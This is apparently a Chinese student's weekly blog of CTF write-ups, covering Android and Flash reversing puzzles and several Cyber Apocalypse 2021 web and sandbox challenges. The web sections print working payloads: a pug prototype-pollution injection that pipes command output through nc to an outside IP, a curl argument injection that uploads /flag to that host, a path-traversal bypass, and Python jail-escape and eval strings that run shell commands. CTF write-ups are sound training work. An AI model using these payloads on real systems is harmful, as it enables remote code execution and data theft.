---
# image bucket id
butterId: 4df72543-170c-4dff-a021-5bc0cff9f636
---

# Week4 Summary

## What have I done

- 练习赛 Cyber Apocalypse 2021 WriteUps
- BUUOJ 刷题 WriteUps

## [WriteUp] How did I accomplish these things

### [SWPU2019]Android1

解压文件之后发现一个库，使用 IDA 打开可以发现四个奇怪的函数，其代码整理后如下。

```c
char *aa(void)
{
  char *result; // rax
  signed int i; // [rsp+Ch] [rbp-14h]
  char v2[3]; // [rsp+11h] [rbp-Fh]
  int v3; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v3 = 'R_C';
  for ( i = 0; i < 3; ++i )
    v2[i] = *((_BYTE *)&v3 + i) ^ 0x37;
  result = v2;
  if ( __readfsqword(0x28u) == v4 )
    result = v2;
  return result;
}

char *aA(void)
{
  char *result; // rax
  signed int i; // [rsp+Ch] [rbp-14h]
  char v2[3]; // [rsp+11h] [rbp-Fh]
  int v3; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v3 = 'AVE';
  for ( i = 0; i < 3; ++i )
    v2[i] = *((_BYTE *)&v3 + i) ^ 0x24;
  result = v2;
  if ( __readfsqword(0x28u) == v4 )
    result = v2;
  return result;
}

char *Aa(void)
{
  char *result; // rax
  signed int i; // [rsp+Ch] [rbp-14h]
  char v2[3]; // [rsp+11h] [rbp-Fh]
  int v3; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v3 = 'MWa';
  for ( i = 0; i < 3; ++i )
    v2[i] = *((_BYTE *)&v3 + i) ^ 0x38;
  result = v2;
  if ( __readfsqword(0x28u) == v4 )
    result = v2;
  return result;
}

char *AA(void)
{
  char *result; // rax
  signed int i; // [rsp+Ch] [rbp-14h]
  char v2[3]; // [rsp+10h] [rbp-10h]
  int v3; // [rsp+13h] [rbp-Dh]
  char v4; // [rsp+17h] [rbp-9h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  v3 = '#$D5';
  v4 = 0;
  for ( i = 0; i < 4; ++i )
    v2[i] = *((_BYTE *)&v3 + i) ^ 0x77;
  result = v2;
  if ( __readfsqword(0x28u) == v5 )
    result = v2;
  return result;
}
```

写个脚本跑出结果。

```c
#include <iostream>
using namespace std;

int main(){
    string aa = "R_C"; //0x37
    string aA = "AVE"; //0x24
    string Aa = "MWa"; //0x38
    string AA = "#$D5"; //0x77
    string result = "";
    for(char c : AA){
        result += c ^ 0x77;
    }
    for(char c : aa){
        result += c ^ 0x37;
    }
    for(char c : aA){
        result += c ^ 0x24;
    }
    for(char c : Aa){
        result += c ^ 0x38;
    }
    reverse(result.begin(),result.end());
    cout << result;
}
```

得到 flag。

```flag
flag{YouaretheB3ST}
```

### [BSidesSF2020]toast-clicker1

使用 jadx 反编译附件可得到如下代码。

```java
int[] input = {67, 83, 68, 120, 62, 109, 95, 90, 92, 112, 85, 73, 99, 82, 53, 99, 101, 92, 80, 89, 81, 104};
public String printfirstFlag() {
    String output = BuildConfig.FLAVOR;
    int i = 0;
    while (true) {
        int[] iArr = this.input;
        if (i >= iArr.length) {
            return output;
        }
        output = output + Character.toString((char) (iArr[i] + i));
        i++;
    }
}
```

写个脚本把上述代码复刻一遍，得到 flag。

```python
input = [67, 83, 68, 120, 62, 109, 95, 90, 92, 112, 85, 73, 99, 82, 53, 99, 101, 92, 80, 89, 81, 104]
output = ""
for x in range(len(input)):
    output += chr(x + input[x])
print(output)
```

```flag
CTF{Bready_To_Crumble}
```

### [*CTF2019]babyflash

JPEXS Free Flash Decompiler 反编译一下 swf 文件可以得到 441 张图片，这个数量正好是 21 的平方，考虑一下是二维码。

![image-20210424162301782](https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619252584536.5d1200faf250cd0ba59755072ae8fd8076967fe7.png)

将所有图片文件名使用 `dir /b` 提取出来并排好序，然后使用指令 `for /f "skip=1" %%a in (files.txt) do certutil -hashfile %%a MD5>>md5.txt` 计算出图片的 MD5。补全第一个图片的 MD5 后整理可得如下内容。

```plain text
111111100110001111111100000100111001000001101110101011001011101101110100100101011101101110100101101011101100000100110001000001111111101010101111111000000001010100000000111011111011111000100110110011011101111011101101111001101111011010010001100000000011111010100000100011000000000001011100110011111111101011100110101100000101101000100010101110101011011000001101110100101101110000101110101101110110001100000101011100010010111111101101100001011
```

可使用如下 receipt 得到前半段 flag。

```plain text
Find_/_Replace({'option':'Regex','string':'0'},'\\xFF',true,false,true,false)
Find_/_Replace({'option':'Regex','string':'1'},'\\x00',true,false,true,false)
Generate_Image('Greyscale',12,21)
Parse_QR_Code(false)
```

```flag
*ctf{half_flag_&
```

将 swf 文件中的音频也导出，使用 Audition 打开后可看到如下内容。

![](https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619254490264.cd2f0825de3b355b40503d04ad10850c9413471b.png)

得到 flag。

```flag
*ctf{half_flag_&&_the_rest}
```

```diff
- *ctf{half_flag_&&_the_rest} // original
+ flag{halfflag&&_the_rest} // flag for BUUOJ
```

### BlitzProp
> 参考：https://blog.p6.is/AST-Injection/
> 下载附件审计代码可以发现 routes 下存在一处 pug 的 AST 注入。

```javascript
router.post('/api/submit', (req, res) => {
    const {song} = unflatten(req.body);
    if (song.name.includes('Not Polluting with the boys') || song.name.includes('ASTa la vista baby') || song.name.includes('The Galactic Rhymes') || song.name.includes('The Goose went wild')) {
        return res.json({
            'response': pug.compile('span Hello #{user}, thank you for letting us know!')({user: 'guest'})
        });
    } else {
        return res.json({
            'response': 'Please provide us with the name of an existing song.'
        });
    }
});
```

按照参考文章构造 payload 如下。curl 和 bash 都没有，所以选了个 nc，也可以尝试弹 shell。
```json
{"song":{"name":"Not Polluting with the boys"},"__proto__.block":{"type": "Text", "line": "console.log(process.mainModule.require('child_process').execSync(`ls | nc 8.136.8.210 3255`).toString())"}}
```

得到如下关键回显。
```plain text
flagTy2bK
index.js
node_modules
package.json
routes
static
view
yarn.lock
```
修改 payload 执行指令为 `cat flagTy2bK` 即可以带出 flag。

```flag
CHTB{p0llute_with_styl3}
```

### Inspector Gadget

网页源代码中可找到如下信息。

```html
<center><h1>CHTB{</h1></center>
<!--1nsp3ction_-->
```

main.js 中有如下信息。

```javascript
console.log("us3full_1nf0rm4tion}");
```

main.css 中有如下信息。

```css
/* c4n_r3ve4l_ */
```

将上述信息整理组合可得 flag。

```flag
CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}
```

### MiniSTRyplace

审计代码可发现此处有一目录穿越。

```php
include('pages/' . (isset($_GET['lang']) ? str_replace('../', '', $_GET['lang']) : $lang[array_rand($lang)]));
```

简单绕过即可读取到 flag，构造载荷如下。

```payload
?lang=....//....//flag
```

得出 flag。

```flag
CHTB{b4d_4li3n_pr0gr4m1ng}
```

### Caas

查看 main.js 可发现接口在 /api/curl，POST 请求，参数为 ip。

```javascript
fetch('/api/curl', {
      method: 'POST',
      body: `ip=${host}`,
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    })
    .then(resp => resp.json())
    .then(data => {
      output.innerHTML = data.message;
    });
```

审计附件代码可以发现指令执行。

```javascript
public function __construct($url)
{
    $this->command = "curl -sL " . escapeshellcmd($url);
}

public function exec()
{
    exec($this->command, $output);
    return $output;
}
```

escapeshellcmd 并不对 @ 字符和配对的引号进行转义，并且仍然可以拼接指令的参数。
>反斜线（\）会在以下字符之前插入： &#;`|*?~<>^()[]{}$\, \x0A 和 \xFF。 ' 和 " 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。

构造出如下载荷。

```payload
ip= -F 'file=@/flag' 8.136.8.210:3255
```

监听服务器端口后发送载荷即可得出 flag。

```flag
CHTB{f1le_r3trieval_4s_a_s3rv1ce}
```

### Alien Camp

简单的交互计算题，写脚本如下。

```python
from pwn import *
connection = remote("46.101.54.143", 31170)
connection.sendline("1")
connection.recvuntil("Here is a little help:\n\n")
model = connection.recvline()
model = model[:-2]
model = model.split(b' ')
items = []
while 0 != len(model):
    key = model.pop(0)
    model.pop(0)
    value = model.pop(0)
    items.append((key, int(value)))

connection.sendline("2")
for x in range(500):
    connection.recvuntil("Question {}:\n\n".format(x + 1))
    question = connection.recvline()
    question = question[:-6]
    for (key, value) in items:
        question = question.replace(key, str(value).encode())
    question = question.decode()
    answer = str(eval(question))
    connection.sendline(answer)
    print("[*] Calculating {} = {} round {}".format(question, answer, x + 1))
for y in range(10):
    content = connection.recvline()
    print(content)
connection.close()
```

跑脚本可得 flag。
```flag
CHTB{3v3n_4l13n5_u53_3m0j15_t0_c0mmun1c4t3}
```

### Build yourself in
> 参考 0x41414141 CTF: https://bigpick.github.io/TodayILearned/articles/2021-01/0x414141ctf
> 引号在参考的基础上被 ban 了。使用如下方法可以拿到 __import__。

```python
print([j for j in ([i for i in (().__class__.__bases__[0].__subclasses__()[94].__init__.__globals__).values()][5].values())][6])
```

按照套路构造出 `ls` 如下。

```python
[j for j in ([i for i in (().__class__.__bases__[0].__subclasses__()[94].__init__.__globals__).values()][5].values())][6](().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[52])[17:23:5]).__dict__[[j for j in ([i for i in (().__class__.__bases__[0].__subclasses__()[94].__init__.__globals__).values()][5].values())][6](().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[52])[17:23:5]).__dir__()[45]](().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[23])[9:7:-1])
```

得到如下回显。

```plain text
build_yourself_in.py
flag.txt
```

构造出 `__import__("os").system("cat flag.txt")` 如下来读取 flag。

```python
[j for j in ([i for i in (().__class__.__bases__[0].__subclasses__()[94].__init__.__globals__).values()][5].values())][6](().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[52])[17:23:5]).__dict__[[j for j in ([i for i in (().__class__.__bases__[0].__subclasses__()[94].__init__.__globals__).values()][5].values())][6](().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[52])[17:23:5]).__dir__()[45]](().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[0])[1:5:2] + ().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[87])[43] + ().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[0])[6:7] + ().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[26])[8:10] + ().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[82])[40:42] + [j for j in ([i for i in (().__class__.__bases__[0].__subclasses__()[94].__init__.__globals__).values()][5].values())][1][-1] + ().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[87])[43] + ().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[87])[42:44])
```

```flag
CHTB{n0_j4il_c4n_h4ndl3_m3!}
```

题目源码如下。

```python
#!/usr/bin/python3.8                                
from sys import version                                                                                                                                       
def main():               
    print(f'{version}\n')     
    print('[*] Only \U0001F47D are allowed!\n')                                                         
    for _ in range(2):        
        text = input('>>> ').lower()
        if "'" in text or '"' in text:
            print('\U000026D4 No quotes are allowed! \U000026D4\n\nExiting..\n')
            break
        else:                   
            exec(text, {'__builtins__': None, 'print':print})


if __name__ == "__main__":   
    main()
```

### Input as a Service

eval 即可得 flag，构造载荷如下。

```python
eval("__import__('os').system(\"cat flag.txt\")") 
```

```flag
CHTB{4li3n5_us3_pyth0n2.X?!}
```

## Summary

打了一场练习赛，虽然没什么师傅在一起做，但是还是玩得很开心，题目都比较简单。下周接着冲冲冲。

